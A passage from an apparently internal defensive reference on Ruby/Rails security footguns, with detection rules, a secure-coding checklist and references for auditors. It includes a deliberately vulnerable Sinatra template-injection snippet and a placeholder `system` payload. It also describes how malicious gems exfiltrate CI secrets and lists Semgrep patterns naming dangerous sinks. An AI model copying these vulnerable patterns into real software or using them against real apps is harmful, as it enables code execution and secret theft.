the embedded escape — color changes, cursor manipulation, and via OSC
sequences plus shell-prompt commands, command injection. Defense:
filter control characters from log output. Class extends beyond Rack:
any logger writing attacker-influenced strings to a terminal is
potentially vulnerable. Cross-link [[reference-shell-injection]]
§"Terminal escape injection".

---

## 10. Sinatra, Roda, Hanami specifics

### 10.1 Sinatra `erb USER_STRING` template injection

```ruby
get "/preview" do
  erb params[:template]   # Direct template injection
end
```

Sinatra's `erb`, `haml`, `slim` helpers accept either a symbol
(naming a template file) or a string (raw template source). With a
string from `params`, the entire template body is attacker-controlled
— RCE through template syntax (`<%= system("...") %>`).

Cross-link [[reference-template-code-injection]] for the
cross-language SSTI treatment; the Ruby-specific surface is the
implicit symbol-vs-string overload of Sinatra's render helpers.

Defense: never pass `params` directly to render helpers. Use
symbol-form (`erb :preview`) with the template in a file under
`views/`.

### 10.2 Sinatra `erb :name, layout: USER`

Even when the template is symbol-form, the `layout:` option accepts
a symbol or string. With a string from params, the layout is
attacker-controlled — same SSTI sink.

### 10.3 Roda's `r.run` and matched-path forwarding

Roda's routing tree uses an `r` (route) object: `r.on "users" do r.run UsersApp end`. The `r.run` primitive forwards the request to
another Rack app. With attacker-influenced path components reaching
the routing layer, mounted apps may receive requests that the parent
app meant to filter out. Audit rule: every `r.run` is a trust-boundary
crossing.

### 10.4 Hanami's stricter defaults

Hanami 2.x ships with CSRF protection (when sessions are enabled), content-security-policy, automatic
HTML escaping, and X-Frame-Options enabled by default. The framework is the closest Ruby
analogue to a "security-by-default" web framework; Rails has caught
up incrementally but inherits some permissive defaults from earlier
versions.

The footgun in Hanami specifically: opt-outs are still per-app.
`config.actions.content_security_policy = false` disables CSP. Audit
rule: read the application's `config/app.rb` to confirm defaults
have not been disabled.

---

## 11. Bundler / RubyGems supply chain

### 11.1 `gem install` runs arbitrary code

When a gem is installed, RubyGems:

1. Reads the gem's `metadata.gz`, a YAML serialization of the
   `Gem::Specification` generated at `gem build` time.
2. If the gem has C extensions, runs `extconf.rb` (Ruby code) and
   compiles via `make`.
3. On `require`, executes the top-level Ruby in `lib/gem_name.rb`
   and any explicitly-required files.

There is no `--ignore-scripts` flag (unlike npm's). The Ruby `gem`
CLI does not allow opting out of native-extension compilation.

A malicious gem can:

- Exfiltrate environment variables during `bundle install` (CI
  contexts: AWS keys, GitHub tokens, Rails master keys).
- Drop a backdoor during `extconf.rb` (the malicious payload runs
  before the application code is even loaded).
- Monkey-patch `Kernel`, `Object`, or `Net::HTTP` on `require` so
  that subsequent application code routes through attacker code.

The Snyk lockfile-injection writeup details a related attack:
modifying `Gemfile.lock` to add gems the `Gemfile` does not declare.
`bundle install` installs them; `bundle install --deployment` halts
when the lockfile differs from what the `Gemfile` requires.

### 11.2 `Gemfile.lock` discipline

The lockfile pins each gem's source and version (checksums only when
the opt-in `CHECKSUMS` section is enabled, Bundler 2.6+). Trust the
lockfile only if:

1. The repository's `Gemfile.lock` is reviewed in CI (diff against
   prior commit; flag unexpected source changes).
2. The `Gemfile` does not include `gem "foo", source: "..."` lines
   pointing at non-rubygems.org sources without an explicit review
   trail.
3. Dependabot or Renovate is configured to PR-bump versions; the PR
   review surfaces the diff.

`bundler-audit` reads the RubySec `ruby-advisory-db` and flags
known-vulnerable versions; integrate into CI.

### 11.3 Real-world incidents

- **rest-client 2019:** attacker took over a maintainer
  account and pushed a malicious version that exfiltrated env vars.
  ~1k downloads before detection.
- **Trail of Bits 2024 RubyGems audit:** 33 issues across the registry
  implementation including an informational finding that RubyGems can
  store Marshaled data alongside gem files.

Cross-link [[reference-cicd-supply-chain]] §"Bundler / RubyGems" for
the full treatment.

### 11.4 Defensive sketch

- Pin versions in `Gemfile.lock`; gate lockfile changes via PR review.
- `bundler-audit` in CI; `bundle install --frozen` fails on lockfile
  drift.
- Dependabot/Renovate for proactive bumps surface gem-source changes
  in PR diffs.
- For high-trust apps: sandboxed CI for `bundle install`; private gem
  server (gemfury, Artifactory) with signed gems.

---

## 12. Detection patterns (Semgrep, Brakeman, RuboCop, CodeQL)

### 12.1 Semgrep rule sketches

Patterns to flag (pattern-either form, `languages: [ruby]`):

- **Eval family:** `eval($X)`, `instance_eval($X)`, `class_eval($X)`,
  `module_eval($X)`, `instance_exec($X, ...)`, `binding.eval($X)`.
- **Deserialization:** `Marshal.load($X)`, `Marshal.restore($X)`,
  `YAML.load($X)`, `YAML.unsafe_load($X)`, `JSON.load($X)`,
  `Oj.load($X)`.
- **Shell interpolation:** ``system("...#{$X}...")``, backtick
  literals with interpolation, `IO.popen("...#{$X}...")`.
- **Rails SQLi:** `$MODEL.where("...#{$X}...")`, `find_by_sql`,
  `order($X)`, `annotate($X)`, `optimizer_hints($X)`.
- **Rails XSS:** `$X.html_safe`, `raw($X)`, `render html: $X`.
- **Open redirect:** `redirect_to params[$X]`, `redirect_to $X.to_s`.
- **Reflection:** `$OBJ.send($X, ...)`, `$OBJ.public_send($X, ...)`,
  `$X.constantize`, `$X.safe_constantize`,
  `Object.const_get($X)`.
- **Path:** `File.read(params[$X])`, `File.open(params[$X], ...)`,
  `Dir.glob("...#{$X}...")`, `send_file(params[$X])`.

Cross-link [[reference-semgrep-rule-authoring]] for precision targets
and corpus testing.

### 12.2 Brakeman, RuboCop, CodeQL

**Brakeman** (canonical Rails-specific scanner) warning classes:
`Command Injection`, `SQL Injection` (where-string / find_by_sql /
order / annotate), `Cross-Site Scripting` (html_safe / raw /
render html), `Redirect`, `Mass Assignment`, `Dangerous Send`,
`Dangerous Eval`, `Remote Code Execution` (Marshal / YAML / Oj),
`File Access`. Should run in CI on every Rails commit; fast,
zero-config, low FP rate on Rails idioms.

**RuboCop Security cops:** `Security/Eval`, `Security/JSONLoad`,
`Security/MarshalLoad`, `Security/Open`, `Security/YAMLLoad`,
`Security/IoMethods`, `Security/CompoundHash`. Style-focused; catches
the most-egregious sinks but not a substitute for Brakeman.

**CodeQL** (`codeql/ruby-queries`, ~50 queries): `rb/unsafe-
deserialization`, `rb/sql-injection`, `rb/code-injection`,
`rb/command-line-injection`, `rb/path-injection`, `rb/url-redirection`,
`rb/regexp-injection`, `rb/incomplete-url-
substring-sanitization`. MRVA is the heavy-weapon option for cross-
repo variant hunting.

---

## 13. Defensive checklist

For every Ruby/Rails project:

1. **No `eval` family with user input.** Audit with RuboCop
   `Security/Eval`; treat every match as a blocker.
2. **No `send`/`public_send` with user-controlled method name.**
   Use hash-of-proc allowlists. Brakeman `Dangerous Send`.
3. **No `Marshal.load`/`YAML.load`/`Oj.load`/`JSON.load` on
   untrusted input.** Use `JSON.parse`; `YAML.safe_load` with
   explicit `permitted_classes`; `Oj.default_options = { mode:
   :strict }`. Cross-link [[reference-deserialization-expertise]].
4. **No backticks or `system(STRING)` with interpolated input.**
   Use argv form `Open3.capture2(cmd, *args)`. Combine with
   leading-`-` rejection at input layer. Cross-link
   [[reference-shell-injection]].
5. **No `Model.where(STRING)`, `find_by_sql(STRING)`,
   `order(USER)`, `annotate(USER)`.** Use hash form or
   placeholders; allowlist `order` columns.
6. **No `redirect_to params[:url]` without host validation.**
   `allow_other_host: false` or explicit allowlist.
7. **No `html_safe`/`raw`/`render html:` on user input.** Use ERB
   default escaping; for HTML-from-string, use `sanitize` or
   Loofah.
8. **No `File.read`/`File.open` with user-controlled path.**
   Resolve with `File.expand_path` + verify under allowed root.
   Cross-link [[reference-code-review-expertise]] §"User-input
   paths".
9. **No `Dir.glob`, `Tempfile.new`, `FileUtils.cp_r` with
   user-controlled patterns/prefixes/destinations.**
10. **Strong parameters with explicit `permit`.** No `permit!`.
    Brakeman `Mass Assignment`.
11. **`SECRET_KEY_BASE` ≥ 128 hex chars, never in version
    control, rotated on suspected leak.**
    `Rails.application.credentials` for secrets at rest.
12. **Brakeman in CI on every commit.** Fail the build on new
    high-severity warnings.
13. **RuboCop Security cops enabled.** Treat as
    informational/medium; not a substitute for Brakeman.
14. **`bundler-audit` in CI.** Reads `ruby-advisory-db`; flags
    known-vulnerable gem versions.
15. **`Regexp.timeout = 1` (or per-regex `timeout:`) for Ruby
    3.2+.** Cross-link [[reference-redos-algorithmic-dos]].

Cross-link [[reference-code-review-expertise]] for the secure-code-
review methodology that frames this checklist as audit items, not
just developer rules.

---

## 14. Variant analysis — under-explored

### 14.1 Ractor (Ruby 3+) — Actor-model concurrency

Ractors (experimental as of 3.4) don't share memory by default;
communication is copy-on-send. Footguns:

- **Shareable objects:** `Ractor.make_shareable` deep-freezes; objects
  with binding-capturing Procs fail to share. Early 3.x had data races
  via buggy `make_shareable`.
- **Per-ractor GIL:** true parallelism reachable. C-extension code
  that relied on the GIL may race.

Cross-link [[reference-race-conditions-concurrency]].

### 14.2 Fiber + async

Fibers are cooperative coroutines. The `async` gem (Samuel Williams)
+ Falcon server use fibers for non-blocking I/O. Footguns:

- **Implicit yield points:** `Net::HTTP.get` yields to the scheduler.
  Code that held an instance variable "atomically across HTTP call"
  may see mutation from another fiber.
- **Connection pool sharing:** must be fiber-safe, not just thread-
  safe.
- **`Thread.current`:** `Thread.current[...]` is fiber-local, not
  thread-local; `thread_variable_get`/`thread_variable_set` values are
  shared by every fiber in the thread.

### 14.3 JRuby and TruffleRuby

- **JRuby:** Java interop direct (`Java::Foo.bar`). Inherits Java
  `ObjectInputStream` deserialization surface (see
  `java_footguns_expertise.md`). Threading is JVM-native (no GIL);
  code relying on MRI's serialize-by-default may race.
- **TruffleRuby (GraalVM):** Java interop via GraalVM Polyglot API
  (not JRuby-compatible). Foreign-object semantics leak into Ruby's
  method-resolution. C extensions run natively since 24.0 (previously via Sulong); MRI assumptions
  in C code may fail.

### 14.4 Sorbet — opt-in typing

`T.unsafe(obj).foo` is the escape hatch (disables type-checking on
receiver). `T.cast(obj, Type)` inserts runtime check. `T.untyped`
overuse undermines guarantees. Sorbet does not catch security bugs
directly; useful adjacent to security work, not a substitute for
Brakeman.

### 14.5 Pattern matching (Ruby 3+)

The `case ... in ...` form raises `NoMatchingPatternError` on no
match. Without an `else` clause, exhaustiveness is enforced *at
runtime*, not compile time — adding a new action variant without
updating the case expression produces 500s in production. Defense:
always include an `else` for user-controlled payloads.

---

## 15. References

### Researchers and primary writeups

- Aaron Patterson — [tenderlove on GitHub](https://github.com/tenderlove)
- Eileen Uchitelle — ["The Case Against Monkey Patching" (Shopify)](https://shopify.engineering/the-case-against-monkey-patching)
- Luke Jahnke — ["Ruby 2.x Universal RCE Deserialization Gadget Chain"
  (elttam, 2018)](https://www.elttam.com/blog/ruby-deserialization);
  ["Ruby 3.4 Universal RCE Deserialization Gadget Chain"
  (nastystereo, 2024)](https://nastystereo.com/security/ruby-3.4-deserialization.html)
- William Bowling (vakzz) — ["Universal Deserialisation Gadget for Ruby
  2.x-3.x" (devcraft.io, 2021)](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html);
  ["Round Two" (2022)](https://devcraft.io/2022/04/04/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)
- Etienne Stalmans — ["Argument injection and getting past
  shellwords.escape" (2019)](https://staaldraad.github.io/post/2019-11-24-argument-injection/);
  ["Universal RCE with Ruby YAML.load"
  (2019/2021)](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)
- Alex Leahu / Include Security — ["Discovering Deserialization Gadget
  Chains in Rubyland"
  (2024)](https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/)
- Trail of Bits — ["Marshal madness" (2025)](https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/);
  ["Auditing the Ruby ecosystem's central package repository"
  (2024)](https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/);
  ["RubySec Field Guide"
  (2015)](https://blog.trailofbits.com/2015/06/08/introducing-the-rubysec-field-guide/)
- GitHub Security Lab — ["Execute commands by sending JSON?"
  (Oj/JSON/Marshal/YAML)](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/)
- Bishop Fox — ["Ruby Vulnerabilities: Exploiting Open, Send, and
  Deserialization"](https://bishopfox.com/blog/ruby-vulnerabilities-exploits)
- Praetorian — ["Ruby Unsafe Reflection
  Vulnerabilities"](https://www.praetorian.com/blog/ruby-unsafe-reflection-vulnerabilities/)
- Matt Palmer — ["Object deserialization attacks using Ruby's Oj JSON
  parser" (2025)](https://www.hezmatt.org/~mpalmer/blog/2025/07/26/object-deserialization-ruby-oj-json-parser.html)

### CVEs

- [CVE-2018-3760 — Sprockets Path Traversal](https://rubysec.com/advisories/CVE-2018-3760/)
  ([Heroku writeup](https://www.heroku.com/blog/rails-asset-pipeline-vulnerability/))
- [CVE-2021-28966 — Tempfile path traversal on
  Windows](https://www.ruby-lang.org/en/news/2021/04/05/tempfile-path-traversal-on-windows-cve-2021-28966/)
- [CVE-2022-30123 — Rack shell escape (GHSA)](https://github.com/advisories/GHSA-wq4h-7r42-5hrr)
  ([Rails announcement](https://discuss.rubyonrails.org/t/cve-2022-30123-possible-shell-escape-sequence-injection-vulnerability-in-rack/80728))
- [CVE-2023-22794 — ActiveRecord annotate SQLi (GHSA)](https://github.com/advisories/GHSA-hq7p-j377-6v63)
  ([Rails announcement](https://discuss.rubyonrails.org/t/cve-2023-22794-sql-injection-vulnerability-via-activerecord-comments/82117))

### Tools / registries / framework guides

- [Brakeman](https://brakemanscanner.org/) and
  [GitHub](https://github.com/presidentbeef/brakeman); [RubySec
  ruby-advisory-db](https://github.com/rubysec/ruby-advisory-db);
  [bundler-audit](https://github.com/rubysec/bundler-audit); [RuboCop
  Security
  cops](https://docs.rubocop.org/rubocop/latest/cops_security.html);
  [CodeQL Ruby queries](https://codeql.github.com/codeql-query-help/ruby/)
- [Rails Security Guide](https://guides.rubyonrails.org/security.html);
  [OWASP Ruby on Rails Cheat
  Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html);
  [Strong Parameters
  (2012)](https://rubyonrails.org/2012/3/21/strong-parameters); [Sorbet
  T.unsafe](https://sorbet.org/docs/untyped)

### Language-runtime documentation

- [Ruby Security
  documentation](https://docs.ruby-lang.org/en/3.2/security_rdoc.html);
  [Psych YAML
  module](https://ruby-doc.org/stdlib-3.1.0/libdoc/psych/rdoc/Psych.html);
  [Psych 4 breaking change](https://github.com/ruby/psych/issues/533);
  [Pattern
  matching](https://docs.ruby-lang.org/en/3.4/syntax/pattern_matching_rdoc.html);
  [Ractor](https://docs.ruby-lang.org/en/3.4/ractor_md.html);
  [Open3](https://docs.ruby-lang.org/en/master/Open3.html)
- ["Symbol GC in Ruby 2.2"
  (SitePoint)](https://www.sitepoint.com/symbol-gc-ruby-2-2/);
  [Schneems](https://www.schneems.com/2015/01/19/ruby-22-symbol-gc.html);
  [Feature #6409 — public_send
  bypass](https://bugs.ruby-lang.org/issues/6409); [Bug #18622 —
  const_get](https://bugs.ruby-lang.org/issues/18622)

### Cross-language reference

- [`deserialization_expertise.md`](./deserialization_expertise.md) §3-4
  (Ruby); [`shell_injection_expertise.md`](./shell_injection_expertise.md)
  §"Argument injection past shell-escape primitives";
  [`code_review_expertise.md`](./code_review_expertise.md);
  [`template_code_injection_expertise.md`](./template_code_injection_expertise.md);
  [`ssrf_url_parsing_expertise.md`](./ssrf_url_parsing_expertise.md);
  [`cicd_supply_chain_expertise.md`](./cicd_supply_chain_expertise.md);
  [`race_conditions_concurrency_expertise.md`](./race_conditions_concurrency_expertise.md);
  [`redos_algorithmic_dos_expertise.md`](./redos_algorithmic_dos_expertise.md);
  [`semgrep_rule_authoring.md`](../static_analysis/semgrep_rule_authoring.md);
  companions:
  [`csharp_dotnet_footguns_expertise.md`](./csharp_dotnet_footguns_expertise.md)
  and [`java_footguns_expertise.md`](./java_footguns_expertise.md)
